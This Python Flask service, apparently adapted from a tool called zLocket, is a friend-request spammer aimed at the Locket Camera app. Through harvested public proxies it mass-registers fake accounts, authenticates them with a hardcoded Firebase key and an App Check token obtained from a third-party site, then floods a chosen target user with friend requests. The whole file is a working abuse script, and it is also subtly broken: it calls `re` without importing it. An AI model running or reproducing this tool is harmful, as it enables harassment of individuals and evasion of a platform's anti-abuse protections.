#!/usr/bin/env python
# coding: utf-8
# Flask API for zLocket Friend Request Spammer
# Based on zLocket-Tool.py (Spam Friend Request part only)
# Author: Adapted from WsThanhDieu's zLocket Tool
# Telegram: @wus_team
# Version: 1.0.7
# Runtime: 4 minutes then auto-shutdown

import sys
import platform
import subprocess
import os
import time
import json
import random
import threading
import queue
import requests
from requests.exceptions import ProxyError
from urllib.parse import urlparse, parse_qs, urlencode
from flask import Flask, request, jsonify
from datetime import datetime
from queue import Queue
import string
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Kiểm tra phiên bản Python
if platform.python_version() < "3.12":
    print(f"\033[91m[!] Phiên bản Python không được hỗ trợ: {platform.python_version()}")
    print(f"\033[92m[+] Yêu cầu: Python 3.12 trở lên")
    sys.exit(1)

# Tự động cài đặt thư viện nếu thiếu
try:
    from colorama import Fore, Style, init
    init()
except ImportError:
    class DummyColors:
        def __getattr__(self, name):
            return ''
    Fore = Style = DummyColors()

_list_ = {
    'requests': 'requests',
    'colorama': 'colorama',
    'urllib3': 'urllib3',
}
_pkgs = [pkg_name for pkg_name in _list_ if not __import__(pkg_name, fromlist=[''])]
if _pkgs:
    print(f"\033[33m[!] Thiếu thư viện: {', '.join(_pkgs)}\033[0m")
    print(f"\033[34m[*] Đang tự động cài đặt thư viện...\033[0m")
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', *_pkgs])
        print(f"\033[32m[✓] Cài đặt thư viện thành công!\033[0m")
    except subprocess.CalledProcessError:
        print(f"\033[31m[✗] Lỗi cài đặt: pip install {' '.join(_pkgs)}\033[0m")
        print(f"\033[31m[!] Vui lòng cài đặt thủ công và thử lại.\033[0m")
        sys.exit(1)

# Flask app
app = Flask(__name__)

# Lớp màu sắc cho log
class xColor:
    YELLOW = '\033[38;2;255;223;15m'
    GREEN = '\033[38;2;0;209;35m'
    RED = '\033[38;2;255;0;0m'
    CYAN = '\033[38;2;0;255;255m'
    MAGENTA = '\033[38;2;255;0;255m'
    WHITE = '\033[38;2;255;255;255m'
    RESET = '\033[0m'

# Lock cho print thread-safe
PRINT_LOCK = threading.RLock()

def sfprint(*args, **kwargs):
    with PRINT_LOCK:
        print(*args, **kwargs)
        sys.stdout.flush()

class zLocket:
    def __init__(self, target_friend_uid: str = "", num_threads: int = 10):
        self.FIREBASE_GMPID = "1:641029076083:ios:cc8eb46290d69b234fa606"
        self.IOS_BUNDLE_ID = "com.locket.Locket"
        self.API_LOCKET_URL = "https://api.locketcamera.com"
        self.FIREBASE_AUTH_URL = "https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        self.FIREBASE_API_KEY = "AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.TOKEN_API_URL = "https://thanhdieu.com/api/v1/locket/token"
        self.SHORT_URL = "https://url.thanhdieu.com/api/v1"
        self.TOKEN_FILE = "token.json"
        self.TOKEN_EXPIRY_TIME = (20 + 9) * 60
        self.FIREBASE_APP_CHECK = None
        self.USE_EMOJI = True
        self.ACCOUNTS_PER_PROXY = random.randint(6, 10)
        self.NAME_TOOL = "zLocket Tool Pro"
        self.VERSION_TOOL = "v1.0.7"
        self.TARGET_FRIEND_UID = target_friend_uid
        self.PROXY_LIST = [
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/http.txt'
        ]
        self.successful_requests = 0
        self.failed_requests = 0
        self.total_proxies = 0
        self.start_time = time.time()
        self.request_timeout = 15
        self.session_id = int(time.time() * 1000)
        self.FIREBASE_APP_CHECK = self._load_token_()
        self.stop_event = threading.Event()

    def _print(self, *args, **kwargs):
        with PRINT_LOCK:
            timestamp = datetime.now().strftime("%H:%M:%S")
            message = " ".join(map(str, args))
            sm = message
            if "[+]" in message:
                sm = f"{xColor.GREEN}{Style.BRIGHT}{message}{Style.RESET_ALL}"
            elif "[✗]" in message:
                sm = f"{xColor.RED}{Style.BRIGHT}{message}{Style.RESET_ALL}"
            elif "[!]" in message:
                sm = f"{xColor.YELLOW}{Style.BRIGHT}{message}{Style.RESET_ALL}"
            sfprint(f"{xColor.CYAN}[{timestamp}]{Style.RESET_ALL} {sm}", **kwargs)

    def _load_token_(self):
        try:
            if not os.path.exists(self.TOKEN_FILE):
                return self.fetch_token()
            self._print(f"{xColor.YELLOW}[?] Verifying token integrity...")
            with open(self.TOKEN_FILE, 'r') as file:
                token_data = json.load(file)
            if 'token' in token_data and 'expiry' in token_data:
                if token_data['expiry'] > time.time():
                    self._print(f"{xColor.GREEN}[+] Loaded token: {xColor.YELLOW}{token_data['token'][:10] + '...' + token_data['token'][-10:]}")
                    time_left = int(token_data['expiry'] - time.time())
                    self._print(f"{xColor.GREEN}[+] Token expires in: {xColor.WHITE}{time_left//60} minutes {time_left % 60} seconds")
                    return token_data['token']
                else:
                    self._print(f"{xColor.RED}[!] Token expired, fetching new token...")
            return self.fetch_token()
        except Exception as e:
            self._print(f"{xColor.RED}[!] Error loading token: {str(e)}")
            return self.fetch_token()

    def save_token(self, token):
        try:
            token_data = {
                'token': token,
                'expiry': time.time() + self.TOKEN_EXPIRY_TIME,
                'created_at': time.time()
            }
            with open(self.TOKEN_FILE, 'w') as file:
                json.dump(token_data, file, indent=4)
            self._print(f"{xColor.GREEN}[+] Token saved to {xColor.WHITE}{self.TOKEN_FILE}")
            return True
        except Exception as e:
            self._print(f"{xColor.RED}[!] Error saving token: {str(e)}")
            return False

    def fetch_token(self, retry=0, max_retries=3):
        if retry >= max_retries:
            self._print(f"{xColor.RED}[!] Token acquisition failed after {max_retries} attempts")
            sys.exit(1)
        try:
            self._print(f"{xColor.MAGENTA}[*] Retrieving token [{retry+1}/{max_retries}]")
            response = requests.get(self.TOKEN_API_URL, timeout=self.request_timeout, proxies={"http": None, "https": None})
            response.raise_for_status()
            data = response.json()
            if data.get("code") == 200 and "data" in data and "token" in data["data"]:
                token = data["data"]["token"]
                self._print(f"{xColor.GREEN}[+] Token acquired successfully")
                self.save_token(token)
                return token
            else:
                self._print(f"{xColor.YELLOW}[!] Error: {data.get('msg', 'Unknown error')}")
                time.sleep(1.3)
                return self.fetch_token(retry + 1)
        except requests.exceptions.RequestException as e:
            self._print(f"{xColor.RED}[!] Token fetch failed: {str(e)}")
            time.sleep(1.3)
            return self.fetch_token(retry + 1)

    def headers_locket(self):
        return {
            'Host': self.API_LOCKET_URL.replace('https://', ''),
            'Accept': '*/*',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'User-Agent': 'com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
        }

    def firebase_headers_locket(self):
        return {
            'Host': 'www.googleapis.com',
            'Accept': '*/*',
            'X-Client-Version': 'iOS/FirebaseSDK/10.23.1/FirebaseCore-iOS',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'X-Ios-Bundle-Identifier': self.IOS_BUNDLE_ID,
            'X-Firebase-GMPID': self.FIREBASE_GMPID,
            'Accept-Language': 'vi',
            'User-Agent': 'FirebaseAuth.iOS/10.23.1 com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
        }

    def analytics_payload(self):
        return {
            "platform": "ios",
            "amplitude": {
                "device_id": "57A54C21-B633-418C-A6E3-4201E631178C",
                "session_id": {"value": str(self.session_id), "@type": "type.googleapis.com/google.protobuf.Int64Value"},
            },
            "google_analytics": {"app_instance_id": "7E17CEB525FA4471BD6AA9CEC2C1BCB8"},
            "ios_version": "1.121.1.1",
        }

    def excute(self, url, headers=None, payload=None, thread_id=None, step=None, proxies_dict=None):
        prefix = f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}{step}{Style.RESET_ALL}]" if thread_id is not None and step else ""
        try:
            response = requests.post(
                url,
                headers=headers or self.headers_locket(),
                json=payload,
                proxies=proxies_dict,
                timeout=self.request_timeout,
                verify=False
            )
            response.raise_for_status()
            self.successful_requests += 1
            return response.json() if response.content else True
        except ProxyError:
            self._print(f"{prefix} {xColor.RED}[!] Proxy connection terminated")
            self.failed_requests += 1
            return "proxy_dead"
        except requests.exceptions.RequestException as e:
            self.failed_requests += 1
            self._print(f"{prefix} {xColor.RED}[!] Network error: {str(e)[:50]}...")
            return None

    def _extract_uid_locket(self, url: str) -> str:
        real_url = self._convert_url(url)
        if not real_url:
            return None
        parsed_url = urlparse(real_url)
        if parsed_url.hostname != "locket.camera":
            return None
        if not parsed_url.path.startswith("/invites/"):
            return None
        parts = parsed_url.path.split("/")
        if len(parts) > 2:
            return parts[2][:28]
        return None

    def _convert_url(self, url: str) -> str:
        if url.startswith("https://locket.camera/invites/"):
            return url
        if url.startswith("https://locket.cam/"):
            try:
                resp = requests.get(
                    url,
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"},
                    timeout=self.request_timeout,
                )
                if resp.status_code == 200:
                    match = re.search(r'window\.location\.href\s*=\s*"([^"]+)"', resp.text)
                    if match:
                        parsed = urlparse(match.group(1))
                        query = parse_qs(parsed.query)
                        enc_link = query.get("link", [None])[0]
                        return enc_link if enc_link else None
                return None
            except Exception:
                return None
        payload = {"type": "toLong", "kind": "url.thanhdieu.com", "url": url}
        headers = {
            "Accept": "*/*",
            "Accept-Language": "vi",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
        }
        try:
            response = requests.post(self.SHORT_URL, headers=headers, data=urlencode(payload), timeout=self.request_timeout, verify=True)
            response.raise_for_status()
            _res = response.json()
            if _res.get("status") == 1 and "url" in _res:
                return _res["url"]
            return None
        except:
            return None

def _rand_str_(length=10, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))

def _rand_name_():
    return _rand_str_(8, chars=string.ascii_lowercase)

def _rand_email_():
    return f"{_rand_str_(15)}@thanhdieu.com"

def _rand_pw_():
    return 'zlocket' + _rand_str_(7)

def format_proxy(proxy_str):
    if not proxy_str:
        return None
    if not proxy_str.startswith(('http://', 'https://')):
        proxy_str = f"http://{proxy_str}"
    return {"http": proxy_str, "https": proxy_str}

def load_proxies(config):
    proxies = []
    try:
        with open('proxy.txt', 'r', encoding='utf-8', errors='ignore') as f:
            file_proxies = [line.strip() for line in f if line.strip()]
            config._print(f"{xColor.GREEN}[+] Found {len(file_proxies)} proxies in proxy.txt")
            proxies.extend(file_proxies)
    except FileNotFoundError:
        config._print(f"{xColor.YELLOW}[!] No local proxy file detected")
    for url in config.PROXY_LIST:
        try:
            config._print(f"{xColor.MAGENTA}[*] Fetching proxies from {url}")
            response = requests.get(url, timeout=config.request_timeout)
            response.raise_for_status()
            url_proxies = [line.strip() for line in response.text.splitlines() if line.strip()]
            proxies.extend(url_proxies)
            config._print(f"{xColor.GREEN}[+] Harvested {len(url_proxies)} proxies from {url.split('/')[2]}")
        except:
            config._print(f"{xColor.RED}[!] Failed to fetch proxies from {url.split('/')[2]}")
    proxies = list(set(proxies))
    valid_proxies = [p for p in proxies if re.match(r'^(\d{1,3}\.){3}\d{1,3}:\d+$', p)]
    config.total_proxies = len(valid_proxies)
    config._print(f"{xColor.GREEN}[+] Loaded {len(valid_proxies)} unique proxies")
    return valid_proxies

def init_proxy(config):
    proxies = load_proxies(config)
    if not proxies:
        config._print(f"{xColor.RED}[!] No valid proxies available")
        sys.exit(1)
    if len(proxies) < 200:
        config._print(f"{xColor.RED}[!] Insufficient proxies ({len(proxies)}), minimum 200 required")
        sys.exit(1)
    random.shuffle(proxies)
    proxy_queue = Queue()
    for proxy in proxies:
        proxy_queue.put(proxy)
    return proxy_queue, len(proxies)

def step1b_sign_in(config, email, password, thread_id, proxies_dict):
    payload = {
        "email": email,
        "password": password,
        "clientType": "CLIENT_TYPE_IOS",
        "returnSecureToken": True
    }
    vtd = config.excute(
        f"{config.FIREBASE_AUTH_URL}/verifyPassword?key={config.FIREBASE_API_KEY}",
        headers=config.firebase_headers_locket(),
        payload=payload,
        thread_id=thread_id,
        step="Auth",
        proxies_dict=proxies_dict
    )
    if vtd and 'idToken' in vtd and 'localId' in vtd:
        config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.GREEN}[✓] Authentication successful")
        return vtd.get('idToken'), vtd.get('localId')
    config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.RED}[✗] Authentication failed")
    return None, None

def step2_finalize_user(config, id_token, thread_id, proxies_dict):
    first_name = config.NAME_TOOL
    last_name = ' '.join(random.sample(['😀', '😂', '😍', '🥰', '😊'], 5)) if config.USE_EMOJI else ''
    username = _rand_name_()
    payload = {
        "data": {
            "username": username,
            "last_name": last_name,
            "require_username": True,
            "first_name": first_name
        }
    }
    headers = config.headers_locket()
    headers['Authorization'] = f"Bearer {id_token}"
    result = config.excute(
        f"{config.API_LOCKET_URL}/finalizeTemporaryUser",
        headers=headers,
        payload=payload,
        thread_id=thread_id,
        step="Profile",
        proxies_dict=proxies_dict
    )
    if result:
        config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.GREEN}[✓] Profile created: {xColor.YELLOW}{username}")
        return True
    config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.RED}[✗] Profile creation failed")
    return False

def step3_send_friend_request(config, id_token, thread_id, proxies_dict):
    payload = {
        "data": {
            "user_uid": config.TARGET_FRIEND_UID,
            "source": "signUp",
            "platform": "iOS",
            "messenger": "Messages",
            "invite_variant": {"value": "1002", "@type": "type.googleapis.com/google.protobuf.Int64Value"},
            "share_history_eligible": True,
            "rollcall": False,
            "prompted_reengagement": False,
            "create_ofr_for_temp_users": False,
            "get_reengagement_status": False
        }
    }
    headers = config.headers_locket()
    headers['Authorization'] = f"Bearer {id_token}"
    result = config.excute(
        f"{config.API_LOCKET_URL}/sendFriendRequest",
        headers=headers,
        payload=payload,
        thread_id=thread_id,
        step="Friend",
        proxies_dict=proxies_dict
    )
    if result:
        config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.GREEN}[✓] Connection established")
        return True
    config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.RED}[✗] Connection failed")
    return False

def step1_create_account(config, thread_id, proxy_queue):
    while not config.stop_event.is_set():
        current_proxy = proxy_queue.get_nowait() if not proxy_queue.empty() else None
        proxies_dict = format_proxy(current_proxy)
        proxy_usage_count = 0
        failed_attempts = 0
        max_failed_attempts = 10
        if not current_proxy:
            config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL}] {xColor.RED}[!] Proxy pool depleted")
            time.sleep(1)
            continue
        config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL}] {xColor.GREEN}● Thread activated with proxy: {xColor.YELLOW}{current_proxy}")
        while not config.stop_event.is_set() and proxy_usage_count < config.ACCOUNTS_PER_PROXY and failed_attempts < max_failed_attempts:
            email = _rand_email_()
            password = _rand_pw_()
            config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Register{Style.RESET_ALL}] {xColor.CYAN}● Initializing: {xColor.YELLOW}{email[:8]}...")
            payload = {
                "data": {
                    "email": email,
                    "password": password,
                    "client_email_verif": True,
                    "client_token": _rand_str_(40, chars=string.hexdigits.lower()),
                    "platform": "ios"
                }
            }
            response_data = config.excute(
                f"{config.API_LOCKET_URL}/createAccountWithEmailPassword",
                headers=config.headers_locket(),
                payload=payload,
                thread_id=thread_id,
                step="Register",
                proxies_dict=proxies_dict
            )
            if response_data == "proxy_dead":
                config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Register{Style.RESET_ALL}] {xColor.RED}[!] Proxy terminated")
                current_proxy = None
                failed_attempts += 1
                continue
            if response_data == "too_many_requests":
                config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Register{Style.RESET_ALL}] {xColor.RED}[!] Connection throttled")
                current_proxy = None
                failed_attempts += 1
                continue
            if isinstance(response_data, dict) and response_data.get('result', {}).get('status') == 200:
                config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Register{Style.RESET_ALL}] {xColor.GREEN}[✓] Identity created: {xColor.YELLOW}{email}")
                proxy_usage_count += 1
                failed_attempts = 0
                id_token, local_id = step1b_sign_in(config, email, password, thread_id, proxies_dict)
                if id_token and local_id:
                    if step2_finalize_user(config, id_token, thread_id, proxies_dict):
                        first_request_success = step3_send_friend_request(config, id_token, thread_id, proxies_dict)
                        if first_request_success:
                            config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Boost{Style.RESET_ALL}] {xColor.YELLOW}🚀 Boosting: Sending 15 more requests")
                            for _ in range(15):
                                if config.stop_event.is_set():
                                    break
                                step3_send_friend_request(config, id_token, thread_id, proxies_dict)
                            config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Boost{Style.RESET_ALL}] {xColor.GREEN}[✓] Boost complete")
                failed_attempts += 1
        if failed_attempts >= max_failed_attempts:
            config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL}] {xColor.RED}[!] Thread restarting: Excessive failures")
        else:
            config._print(f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL}] {xColor.YELLOW}● Proxy limit reached")

@app.route('/spam_friend_request', methods=['POST'])
def spam_friend_request():
    data = request.json
    target_url = data.get('target_url')
    num_threads = data.get('num_threads', 10)
    custom_username = data.get('custom_username', 'zLocket Tool Pro')
    use_emoji = data.get('use_emoji', True)

    if not target_url:
        return jsonify({"error": "Target URL or username is required"}), 400

    config = zLocket(num_threads=num_threads)
    config.NAME_TOOL = custom_username if len(custom_username) <= 20 else custom_username[:20]
    config.USE_EMOJI = use_emoji

    uid = config._extract_uid_locket(target_url)
    if not uid:
        return jsonify({"error": "Invalid Locket URL or username"}), 400
    config.TARGET_FRIEND_UID = uid

    if not config.FIREBASE_APP_CHECK:
        return jsonify({"error": "Failed to acquire Locket token"}), 500

    proxy_queue, num_threads = init_proxy(config)
    threads = []
    start_time = time.time()
    runtime_limit = 4 * 60  # 4 phút

    for i in range(num_threads):
        thread = threading.Thread(target=step1_create_account, args=(config, i, proxy_queue))
        threads.append(thread)
        thread.daemon = True
        thread.start()

    try:
        while time.time() - start_time < runtime_limit:
            if config.stop_event.is_set():
                break
            time.sleep(1)
        config.stop_event.set()
    except KeyboardInterrupt:
        config.stop_event.set()

    for t in threads:
        t.join(timeout=1.0)

    elapsed = time.time() - start_time
    hours, remainder = divmod(int(elapsed), 3600)
    minutes, seconds = divmod(remainder, 60)
    stats = {
        "runtime": f"{hours:02d}:{minutes:02d}:{seconds:02d}",
        "successful_requests": config.successful_requests,
        "failed_requests": config.failed_requests,
        "total_proxies": config.total_proxies
    }
    return jsonify({"message": "Spam completed", "stats": stats})

if __name__ == "__main__":
    try:
        app.run(host='0.0.0.0', port=5000)
    finally:
        os._exit(0)
